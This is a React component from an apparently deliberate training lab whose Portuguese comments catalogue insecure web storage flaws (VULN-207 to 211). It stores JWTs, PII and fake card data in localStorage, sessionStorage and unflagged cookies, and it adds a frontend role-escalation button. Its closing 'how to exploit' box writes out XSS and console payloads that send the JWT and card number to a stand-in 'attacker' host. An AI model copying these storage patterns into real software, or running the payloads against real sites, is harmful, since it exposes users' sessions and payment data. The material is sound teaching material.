// =====================================================================
// VULN-207  JWT ARMAZENADO EM localStorage (acessivel via XSS)
// CWE-922  |  OWASP A02:2021  |  CVSS 7.5 (High)
// Ao fazer login, o JWT e salvo em localStorage (nao em httpOnly cookie).
// Qualquer XSS (DOM ou stored) pode roubar o token via document.cookie
// ou localStorage.getItem('jwt').
//
// VULN-208  REFRESH TOKEN EM localStorage
// CWE-922  |  OWASP A02:2021  |  CVSS 8.1 (High)
//
// VULN-209  PII / CREDENCIAIS EM sessionStorage
// CWE-922  |  OWASP A02:2021  |  CVSS 5.3 (Medium)
//
// VULN-210  DADOS SENSIVEIS EM COOKIE SEM FLAGS (httpOnly/Secure)
// CWE-614 + CWE-1004  |  OWASP A02:2021  |  CVSS 5.3 (Medium)
//
// VULN-211  CLIENTE ARMAZENA ROLE → AUTH BYPASS NO FRONTEND
// CWE-602  |  OWASP A04:2021  |  CVSS 8.1 (High)
// =====================================================================
import React, { useState, useEffect, useCallback } from 'react';

const FAKE_JWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.FAKE_SIGNATURE_secret123';
const FAKE_REFRESH = 'rt_cyberdyne_' + btoa('admin:superadmin:' + Date.now());

export default function InsecureStorage() {
  const [loginStatus, setLoginStatus] = useState('');
  const [storageView, setStorageView] = useState({});
  const [isAdmin, setIsAdmin] = useState(false);

  const refreshView = useCallback(() => {
    const ls = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      ls[k] = localStorage.getItem(k);
    }
    const ss = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      ss[k] = sessionStorage.getItem(k);
    }
    setStorageView({ localStorage: ls, sessionStorage: ss, cookies: document.cookie });
    setIsAdmin(localStorage.getItem('user_role') === 'superadmin');
  }, []);

  useEffect(() => { refreshView(); }, [refreshView]);

  async function doLogin() {
    try {
      const r = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'admin123' })
      });
      const data = await r.json();
      if (data.token) {
        // VULN-207: JWT no localStorage
        localStorage.setItem('jwt', data.token);
        localStorage.setItem('jwt_raw', JSON.stringify(data));

        // VULN-208: Refresh token no localStorage
        localStorage.setItem('refresh_token', FAKE_REFRESH);

        // VULN-211: Role do usuario no localStorage (editavel pelo atacante)
        localStorage.setItem('user_role', data.user?.role || 'user');
        localStorage.setItem('user_id', String(data.user?.id || 0));
        localStorage.setItem('username', data.user?.username || '');

        // VULN-209: PII no sessionStorage
        sessionStorage.setItem('user_email', 'admin@vulnhub.local');
        sessionStorage.setItem('user_ssn', '123-45-6789');
        sessionStorage.setItem('credit_card', '4242424242424242');
        sessionStorage.setItem('cvv', '123');
        sessionStorage.setItem('billing_address', '1600 Amphitheatre Parkway, Mountain View, CA');

        // VULN-210: Cookie sem Secure, sem HttpOnly, sem SameSite
        document.cookie = `session_token=${data.token}; path=/`;
        document.cookie = `user_role=${data.user?.role}; path=/`;
        document.cookie = `api_key=sk-cyberdyne-prod-FAKEFAKE1234; path=/`;
        document.cookie = `internal_url=http://10.0.0.5:3000; path=/`;

        setLoginStatus(`Login OK! Token: ${data.token.slice(0, 40)}...`);
      } else {
        setLoginStatus('Falha: ' + JSON.stringify(data));
      }
    } catch (e) {
      setLoginStatus('Erro: ' + e.message);
    }
    refreshView();
  }

  function clearAll() {
    localStorage.clear();
    sessionStorage.clear();
    document.cookie.split(';').forEach(c => {
      document.cookie = c.trim().split('=')[0] + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';
    });
    setLoginStatus('');
    refreshView();
  }

  function escalatePrivilege() {
    // VULN-211: Escalacao de privilegio no frontend — basta mudar o localStorage
    localStorage.setItem('user_role', 'superadmin');
    localStorage.setItem('is_admin', 'true');
    refreshView();
  }

  return (
    <div>
      <h2>Insecure Storage Lab (VULN-207..211)</h2>

      <div style={{ display: 'flex', gap: 12, marginBottom: 16 }}>
        <button onClick={doLogin} style={{ padding: '10px 20px', background: '#2196f3', color: '#fff', border: 'none', cursor: 'pointer' }}>
          Login como admin (salva JWT no localStorage)
        </button>
        <button onClick={escalatePrivilege} style={{ padding: '10px 20px', background: '#f44336', color: '#fff', border: 'none', cursor: 'pointer' }}>
          Escalar para admin (VULN-211)
        </button>
        <button onClick={clearAll} style={{ padding: '10px 20px' }}>Limpar tudo</button>
        <button onClick={refreshView} style={{ padding: '10px 20px' }}>Refresh</button>
      </div>

      {loginStatus && <p style={{ color: '#2e7d32', fontWeight: 'bold' }}>{loginStatus}</p>}

      <div style={{ padding: 12, marginBottom: 16, border: '2px solid ' + (isAdmin ? 'red' : '#ccc'), background: isAdmin ? '#ffeaea' : '#f5f5f5' }}>
        <h3>VULN-211: Frontend Auth Check</h3>
        {isAdmin ? (
          <div>
            <p style={{ color: 'red', fontWeight: 'bold' }}>ADMIN ACCESS GRANTED (based on localStorage.user_role)</p>
            <p>Painel admin carregado sem validacao server-side.</p>
            <ul>
              <li><a href="/api/auth/admin" target="_blank" rel="noreferrer">Admin Secrets</a></li>
              <li><a href="/api/cloud/config" target="_blank" rel="noreferrer">Cloud Keys</a></li>
              <li><a href="/api/.env" target="_blank" rel="noreferrer">.env File</a></li>
            </ul>
          </div>
        ) : (
          <p>Acesso negado. Clique "Escalar para admin" ou mude <code>localStorage.user_role</code> no DevTools.</p>
        )}
      </div>

      <h3>Conteudo do Web Storage + Cookies</h3>
      <pre style={{ background: '#1a1a2e', color: '#0f0', padding: 16, overflow: 'auto', fontSize: 11, maxHeight: 500 }}>
{JSON.stringify(storageView, null, 2)}
      </pre>

      <div style={{ marginTop: 16, padding: 12, background: '#fff3e0', fontSize: 12 }}>
        <h4>Como explorar (XSS → roubo de token)</h4>
        <p>1. Va para a aba "DOM XSS" e injete: <code>&lt;img src=x onerror="fetch('http://attacker/?jwt='+localStorage.getItem('jwt'))"&gt;</code></p>
        <p>2. Ou no console: <code>fetch('http://attacker/?jwt='+localStorage.getItem('jwt')+'&cc='+sessionStorage.getItem('credit_card'))</code></p>
        <p>3. Cookies tambem acessiveis: <code>document.cookie</code> (sem httpOnly)</p>
      </div>
    </div>
  );
}
